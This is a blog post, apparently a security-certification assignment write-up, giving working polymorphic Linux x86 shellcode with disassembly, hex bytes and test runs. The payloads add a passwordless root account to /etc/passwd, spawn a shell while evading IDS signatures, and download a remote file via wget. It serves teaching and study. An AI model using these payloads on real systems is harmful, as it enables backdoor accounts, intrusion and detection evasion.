---
layout: single
title: SLAE Assignment 6 - Polymorphic Shellcode
date: 2020-5-12
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING32.png
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
This is the sixth post of the SLAE exam assignments serie.  

The goal of this assignement is to create polymorphic versions of three shellcodes from [Shell Storm](http://shell-storm.org/shellcode/)
These versions cannot be larger than 150% of the original shellcode and we get bonus points to make them shorter.
In the context of this assignment, polymorphic means that we need to re-write these shellcodes using different instructions that does the same things as the original.

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-06-Polymorphic_shellcodes)

## Shellcodes

The payloads I've chosen this time are :

	- [add root user (r00t) with no password to /etc/passwd by Kris Katterjohn](http://shell-storm.org/shellcode/files/shellcode-211.php)
	- [execve /bin/sh anti-ids 40 bytes by NicatiN](http://shell-storm.org/shellcode/files/shellcode-256.php)
	- [Remote file Download - 42 bytes by Jonathan Salwan](http://shell-storm.org/shellcode/files/shellcode-611.php)

## Add root user without password

The original code is as follow (gdb dump) :
**Size : 69 bytes**
```nasm
   ; man 2 open
   ; int open(const char *pathname, int flags);
=> 0x00404040 <+0>:	push   0x5
   0x00404042 <+2>:	pop    eax         ; Open syscall number
   0x00404043 <+3>:	xor    ecx,ecx     
   0x00404045 <+5>:	push   ecx         ; String terminator
   0x00404046 <+6>:	push   0x64777373  ; dwss
   0x0040404b <+11>:	push   0x61702f2f  ; ap//
   0x00404050 <+16>:	push   0x6374652f  ; cte/
   0x00404055 <+21>:	mov    ebx,esp	   ; pointer to "/etc//passwd"
   0x00404057 <+23>:	mov    cx,0x401    ; => octal:2001, flags O_APPEND/O_WRONLY
					   ; # define O_APPEND         02000
					   ; #define O_WRONLY             01
   0x0040405b <+27>:	int    0x80        ; exec open

   0x0040405d <+29>:	mov    ebx,eax     ; copy file descriptor to EBX
   0x0040405f <+31>:	push   0x4   
   0x00404061 <+33>:	pop    eax         ; write syscall number
   0x00404062 <+34>:	xor    edx,edx    
   0x00404064 <+36>:	push   edx         ; string terminator
   0x00404065 <+37>:	push   0x3a3a3a30  ; :::0
   0x0040406a <+42>:	push   0x3a303a3a  ; :0::
   0x0040406f <+47>:	push   0x74303072  ; t00r
   0x00404074 <+52>:	mov    ecx,esp     ; pointer to "r00t::0:0:::"
   0x00404076 <+54>:	push   0xc     
   0x00404078 <+56>:	pop    edx         ; string length 12
   0x00404079 <+57>:	int    0x80        ; exec write

   0x0040407b <+59>:	push   0x6          
   0x0040407d <+61>:	pop    eax         ; close syscall number (EBX set to fd) 
   0x0040407e <+62>:	int    0x80        ; close file descriptor

   0x00404080 <+64>:	push   0x1	   
   0x00404082 <+66>:	pop    eax         ; exit syscall number
   0x00404083 <+67>:	int    0x80        ; exit
```

Polymorphic version :
**Size : 69 bytes**
```nasm
    xor     ebx, ebx
    mul     ebx			; EAX, EBX, EDX set to 0
    mov     al, 0x5		; open syscall number
    push    ebx			; string terminator
    push    0x64777373		
    push    0x61702f2f
    push    0x6374652f
    xchg    ebx, ecx		; ECX set to 0
    lea     ebx, [esp]		; EBX point to /etc/passwd
    mov     ch, 0x4		
    inc     ecx			; ECX => 0x401
    int     0x80

    xchg    eax, ebx		; Copy fd in EBX
    mov     eax, edx		; EAX set to 0
    push    eax			; String terminator
    xchg    al, ch		; EAX = 0x4 => write syscall number
    push    0x3a3a3a30
    push    0x3a303a3a
    push    0x74303072
    lea     ecx, [esp]		; ECX point to "r00t::0:0:::"
    mov     dl, 0xc		; string lengh
    int     0x80

    shr     eax, 1      	; write return number of bytes written (0xC) 
                        	; 0xC / 2 => 0x6 close syscall number
    int     0x80

    xchg    al, dh		; EAX set to 0
    inc     eax			; exit syscall number
    int     0x80
```

Original shellcode :
"\x6a\x05\x58\x31\xc9\x51**\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63**\x89\xe3\x66"
"\xb9\x01\x04**\xcd\x80**\x89\xc3\x6a\x04\x58\x31\xd2\x52**\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68**"
"**\x72\x30\x30\x74**\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a\x06\x58**\xcd\x80**\x6a\x01\x58**\xcd\x80**";

The new shellcode :
"\x31\xdb\xf7\xe3\xb0\x05\x53**\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63**\x87\xd9"
"\x8d\x1c\x24\xb5\x04\x41**\xcd\x80**\x93\x89\xd0\x50\x86\xc5**\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a**"
"**\x68\x72\x30\x30\x74**\x8d\x0c\x24\xb2\x0c\xcd\x80\xd1\xe8**\xcd\x80**\x86\xc6\x40**\xcd\x80**"

We retrieve only the two strings and the three interrupt 80 instructions.

```plaintext
root@kali:~# gcc -fno-stack-protector -z execstack shellcode.c -o add-root-poly
root@kali:~# ./add-root-poly
Payload Length:  69

root@kali:~# tail -3 /etc/passwd
ftpuser:x:1000:1000::/dev/null:/etc
statd:x:137:65534::/var/lib/nfs:/usr/sbin/nologin
r00t::0:0:::root@kali:~#
```

## execve /bin/sh anti-ids

The original code is as follow (gdb dump) :
**Size : 40 bytes**
```nasm
=> 0x00404040 <+0>:	cdq    			; set EDX to 0
   0x00404041 <+1>:	push   edx		; 
   0x00404042 <+2>:	pop    eax		; set EAX to 0
   0x00404043 <+3>:	push   edx		; push string terminator
   0x00404044 <+4>:	mov    edi,0x343997b7	; 
   0x00404049 <+9>:	add    edi,edi		; EDI => 0x68732f6e
   0x0040404b <+11>:	push   edi		; push hs/n
   0x0040404c <+12>:	mov    edi,0x34b11797	;
   0x00404051 <+17>:	add    edi,edi		; EDI => 0x69622f2f
   0x00404053 <+19>:	inc    edi		; EDI += 1
   0x00404054 <+20>:	push   edi		; push ib//
   0x00404055 <+21>:	mov    ebx,esp		; EBX pointer to //bin/sh

   0x00404057 <+23>:	push   edx		; push 0
   0x00404058 <+24>:	push   ebx		; push //bin/sh address
   0x00404059 <+25>:	mov    ecx,esp		; ECX point to stack (["//bin/sh"])
   0x0040405b <+27>:	mov    al,0x63		;
   0x0040405d <+29>:	sub    al,0x58		; AL => 0xb execve syscall number 
   0x0040405f <+31>:	sub    edi,0x6961ae62	; EDI set to 0x80cd
   0x00404065 <+37>:	push   edi		; push int 0x80 opcode
   0x00404066 <+38>:	call   esp		; go to int 0x80 

```

Polymorphic version :
**Size : 37 bytes**
```nasm
    xor    edi, edi
    mul    edi			; set EAX,EDX,EDI to 0
    push   edi                  ; push string terminator
    sub    eax, 0x978CD092      ; EAX => 0x68732f6e
    push   eax                  ; push hs/n
    sub    edi, 0x969DD0D1	; EDI => 0x69622f2f
    push   edi		        ; push ib//
    lea    ebx, [esp]      	; EBX pointer to //bin/sh
    mov    ecx, edx		; ECX set to null pointer
    add    eax, 0x978CD09D	; EAX => 0xb execve syscall number
    sub    dx, 0x7F33		; EDX set to 0x80cd
    push   edx		        ; push int 0x80 opcode
    push   esp
    cdq				; EDX set to 0x00
    ret				; go to "int 0x80" address
```

Original shellcode :
"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4";

The new shellcode :
"\x31\xff\xf7\xe7\x57\x2d\x92\xd0\x8c\x97\x50\x81\xef\xd1\xd0\x9d\x96\x57\x8d\x1c\x24\x89\xd1\x05\x9d\xd0\x8c\x97\x66\x81\xea\x33\x7f\x52\x54\x99\xc3"

There is no series of two identical bytes, and it is three bytes shorter than original.

```plaintext
root@kali:~# gcc -fno-stack-protector -z execstack shellcode.c -o anti-ids
root@kali:~# ./anti-ids
Payload Length:  36
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

## Remote file Download 

The original code is as follow (gdb dump) :
**Size : 42 bytes**
```nasm
=> 0x00404040 <+0>:	push   0xb	   ;
   0x00404042 <+2>:	pop    eax	   ; Execve syscall number
   0x00404043 <+3>:	cdq    		   ; edx set to 0
   0x00404044 <+4>:	push   edx	   ; push string terminator	
   0x00404045 <+5>:	push   0x61616161  ; The url of the file to download 
					   ; here 'aaaa'
   0x0040404a <+10>:	mov    ecx,esp	   ; ECX point to the url argument
   0x0040404c <+12>:	push   edx	   ; push string terminator 
					   ; [Useless here push 0x74 will insert nullbytes]]
   0x0040404d <+13>:	push   0x74	   ; t
   0x0040404f <+15>:	push   0x6567772f  ; egw/
   0x00404054 <+20>:	push   0x6e69622f  ; nib/
   0x00404059 <+25>:	push   0x7273752f  ; rsu/  
   0x0040405e <+30>:	mov    ebx,esp     ; EBX point to /usr/bin/wget
   0x00404060 <+32>:	push   edx         ; null pointer
   0x00404061 <+33>:	push   ecx         ; Address of first wget arguments
   0x00404062 <+34>:	push   ebx         ; Address of cmd string
   0x00404063 <+35>:	mov    ecx,esp     ; ECX set to *args
   0x00404065 <+37>:	int    0x80        ; execve("/usr/bin/wget, ["/usr/bin/wget","aaaa"],null)
   0x00404067 <+39>:	inc    eax	   ; Assume that execve return 0 to set exit syscall num
   0x00404068 <+40>:	int    0x80        ; exit()
```

Polymorphic version :
**Size : 62 bytes (147.6%)**
```nasm
    xor     eax, eax
    mul     eax			; EDX, EAX set to 0
    push    eax			; string terminator
    push    0x61616161		; "aaaa" wget url argument
    mov     al, 0xb		; execve syscall
    lea     ecx, [esp]		; ECX point to "aaaa"

    push    0x74		; t
    mov     ebx, 0xcaceee5e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; egw/
    mov     ebx, 0xdcd2c45e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; nib/
    mov     ebx, 0xe4e6ea5e
    shr     ebx, 1		; shift one byte to the right
    push    ebx			; rsu/
    lea     ebx, [esp]		; EBX point to "/usr/bin/wget"

    mov     [esp-4], edx	; "push" null
    mov     [esp-8], ecx	; "push" pointer on wget url argument
    mov     [esp-12], ebx	; "push" pointer to wget command
    lea     ecx, [esp-12]	; ECX point to *args
    int     0x80		; exec execve("/usr/bin/wget", ["/usr/bin/wget","aaaa"],null)
```

Original shellcode :
"\x6a\x0b\x58\x99\x52**\x68\x61\x61\x61\x61**\x89\xe1\x52\x6a\x74"\x68\x2f\x77\x67\x65"
"\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x40**\xcd\x80**"

"\x31\xc0\xf7\xe0\x50\xb0\x0b**\x68\x61\x61\x61\x61**\x8d\x0c\x24\x6a\x74\xbb\x5e\xee\xce\xca\xd1\xeb"
"\x53\xbb\x5e\xc4\xd2\xdc\xd1\xeb\x53\xbb\x5e\xea\xe6\xe4\xd1\xeb\x53\x8d\x1c\x24\x89\x54\x24\xfc"
"\x89\x4c\x24\xf8\x89\x5c\x24\xf4\x8d\x4c\x24\xf4**\xcd\x80**"

I did not replace the 'aaaa' string because when used in real life we will set a valid url in place of it.
Except it there is only the int 0x80 at the end that we can find.

```plaintext
#To test it we need to add a line in /etc/hosts and use a webserver:

root@kali:~/ echo "127.0.0.1 aaaa" >> /etc/hosts
root@kali:~/ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

#Then on another terminal :
root@kali:~# ./remote-dwnld-poly 
Payload Length:  62
--2020-05-12 04:09:37--  http://aaaa/
Resolving aaaa (aaaa)... 127.0.0.1
Connecting to aaaa (aaaa)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1008 [text/html]
Saving to: 'index.html'

index.html         100%[=====================>]    1008  --.-KB/s    in 0s      

2020-05-12 04:09:37 (3.56 MB/s) - 'index.html' saved [1008/1008]
```

That's it, the next post will be the last of the serie.

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***
